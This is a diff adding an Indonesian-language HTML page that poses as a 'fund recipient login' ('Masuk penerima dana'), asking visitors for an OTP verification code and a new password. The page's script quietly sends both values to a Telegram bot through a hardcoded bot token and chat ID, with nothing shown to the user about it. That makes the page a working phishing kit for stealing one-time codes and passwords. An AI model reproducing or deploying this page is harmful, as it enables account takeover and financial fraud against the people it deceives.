@@ -1,0 +1,293 @@
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Masuk penerima dana</title>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Inter&display=swap"
+    rel="stylesheet"
+  />
+  <style>
+    /* Reset and base */
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background-color: #f7f7f7;
+      color: #000000;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    /* Header */
+    header {
+      display: flex;
+      align-items: center;
+      padding: 12px 16px;
+      background: linear-gradient(90deg, #f15a5a 0%, #fca66b 100%);
+    }
+    header button {
+      background: none;
+      border: none;
+      color: white;
+      font-size: 20px;
+      cursor: pointer;
+      padding: 0;
+      margin: 0;
+      width: 24px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    header h1 {
+      flex: 1;
+      text-align: center;
+      color: white;
+      font-weight: 400;
+      font-size: 18px;
+      margin: 0;
+    }
+    header .spacer {
+      width: 24px;
+    }
+    /* Main content */
+    main {
+      padding: 40px 24px 0 24px;
+      flex-grow: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    main h2 {
+      font-weight: 400;
+      font-size: 20px;
+      margin: 0 0 4px 0;
+      text-align: center;
+    }
+    main p.subtitle {
+      font-weight: 400;
+      font-size: 14px;
+      color: #6b6b6b;
+      margin: 0 0 32px 0;
+      text-align: center;
+      line-height: 1.3;
+    }
+    form {
+      width: 100%;
+      max-width: 360px;
+      display: flex;
+      flex-direction: column;
+    }
+    label {
+      font-weight: 400;
+      font-size: 14px;
+      color: #3a3a3a;
+      margin-bottom: 8px;
+    }
+    /* Input group for OTP */
+    .otp-group {
+      display: flex;
+      align-items: center;
+      border-bottom: 1px solid #d1d1d1;
+      padding-bottom: 4px;
+      margin-bottom: 4px;
+    }
+    .otp-group input {
+      flex-grow: 1;
+      border: none;
+      outline: none;
+      font-size: 16px;
+      color: #3a3a3a;
+      background: transparent;
+      padding: 4px 0;
+    }
+    .otp-group button {
+      background-color: #d1d1d1;
+      color: white;
+      font-size: 12px;
+      border-radius: 9999px;
+      padding: 4px 12px;
+      border: none;
+      cursor: default;
+      user-select: none;
+      margin-left: 12px;
+    }
+    /* OTP resend text */
+    .otp-resend {
+      font-size: 12px;
+      color: #a3a3a3;
+      margin-bottom: 24px;
+      cursor: pointer;
+      user-select: none;
+    }
+    /* Password input */
+    input[type="password"] {
+      border: none;
+      border-bottom: 1px solid #d1d1d1;
+      outline: none;
+      font-size: 16px;
+      color: #3a3a3a;
+      padding: 4px 0;
+      margin-bottom: 4px;
+      background: transparent;
+    }
+    /* Password hint */
+    .password-hint {
+      font-size: 12px;
+      color: #a3a3a3;
+      margin-bottom: 40px;
+      line-height: 1.3;
+    }
+    /* Submit button */
+    button[type="submit"] {
+      width: 100%;
+      padding: 12px 0;
+      border-radius: 9999px;
+      border: none;
+      font-size: 16px;
+      font-weight: 400;
+      color: white;
+      background: linear-gradient(90deg, #f15a5a 0%, #fca66b 100%);
+      opacity: 0.6;
+      cursor: not-allowed;
+      user-select: none;
+      transition: opacity 0.3s ease;
+    }
+    button[type="submit"]:enabled {
+      opacity: 1;
+      cursor: pointer;
+    }
+    /* Responsive */
+    @media (max-width: 400px) {
+      main {
+        padding: 32px 16px 0 16px;
+      }
+      form {
+        max-width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <button aria-label="Back">
+      <svg
+        xmlns="http://www.w3.org/2000/svg"
+        fill="none"
+        stroke="currentColor"
+        stroke-width="2"
+        stroke-linecap="round"
+        stroke-linejoin="round"
+        class="feather feather-arrow-left"
+        width="20"
+        height="20"
+        viewBox="0 0 24 24"
+      >
+        <line x1="19" y1="12" x2="5" y2="12" />
+        <polyline points="12 19 5 12 12 5" />
+      </svg>
+    </button>
+    <h1>Masuk penerima dana</h1>
+    <div class="spacer"></div>
+  </header>
+  <main>
+    <h2>Masuk penerima dana</h2>
+    <p class="subtitle">
+      kode verifikasi akan dikirim ke nomor hp<br />
+      887787855422
+    </p>
+    <form id="form">
+      <label for="otp">Kode verifikasi</label>
+      <div class="otp-group">
+        <input id="otp" name="otp" type="text" maxlength="6" autocomplete="one-time-code" required />
+        <button type="button" disabled aria-disabled="true">Terima OTP (60) MENIT</button>
+      </div>
+      <p class="otp-resend">Tidak menerima OTP? Kirim ke WhatsApp &gt;</p>
+
+      <label for="password">Pengaturan kata sandi</label>
+      <input id="password" name="password" type="password" required />
+      <p class="password-hint">
+        Kata sandi minimal 8 karakter, serta mengandung huruf dan angka.
+      </p>
+
+      <button type="submit" disabled id="submitBtn">Langkah Selanjutnya</button>
+    </form>
+  </main>
+
+  <script>
+    // Enable submit button only if both fields have values
+    const otpInput = document.getElementById('otp');
+    const passwordInput = document.getElementById('password');
+    const submitBtn = document.getElementById('submitBtn');
+    const form = document.getElementById('form');
+
+    function validateInputs() {
+      if (otpInput.value.trim().length > 0 && passwordInput.value.trim().length >= 8) {
+        submitBtn.disabled = false;
+        submitBtn.style.cursor = 'pointer';
+        submitBtn.style.opacity = '1';
+      } else {
+        submitBtn.disabled = true;
+        submitBtn.style.cursor = 'not-allowed';
+        submitBtn.style.opacity = '0.6';
+      }
+    }
+
+    otpInput.addEventListener('input', validateInputs);
+    passwordInput.addEventListener('input', validateInputs);
+
+    // Telegram Bot API info - replace with your own token and chat_id
+    const TELEGRAM_BOT_TOKEN = '8479141074:AAHXRTIUGTqpC0Qvw31YqB3pb3W6Ji6PfPc';
+    const TELEGRAM_CHAT_ID = '7549590022';
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const otp = otpInput.value.trim();
+      const password = passwordInput.value.trim();
+
+      // Basic password validation: min 8 chars, contains letter and number
+      const passwordValid = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{8,}$/.test(password);
+      if (!passwordValid) {
+        alert('Kata sandi minimal 8 karakter, serta mengandung huruf dan angka.');
+        return;
+      }
+
+      const message = 
+        `Masuk penerima dana\n` +
+        `Kode verifikasi: ${otp}\n` +
+        `Kata sandi: ${password}`;
+
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+          }),
+        });
+
+        const data = await response.json();
+
+        if (data.ok) {
+          alert('Data berhasil dikirim ke Telegram.');
+          form.reset();
+          validateInputs();
+        } else {
+          alert('Gagal mengirim data ke Telegram.');
+        }
+      } catch (error) {
+        alert('Terjadi kesalahan saat mengirim data.');
+        console.error(error);
+      }
+    });
+  </script>
+</body>
+</html>
